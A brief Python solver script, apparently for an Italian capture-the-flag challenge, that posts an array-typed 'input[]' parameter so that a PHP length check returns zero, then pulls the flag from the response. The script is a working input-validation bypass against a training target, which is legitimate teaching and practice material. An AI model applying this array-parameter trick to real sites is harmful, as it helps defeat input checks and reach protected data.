import requests # sito con query post violabile poichè array != stringa ma strlen(array) == 0
site = "http://soundofsilence.challs.olicyber.it/"
r = requests.post(site, data={"input[]":""})
#print(r.text)
pos = r.text.find("flag")
pos2 = r.text[pos:].find("}")
print(r.text[pos:pos+pos2+1], end="")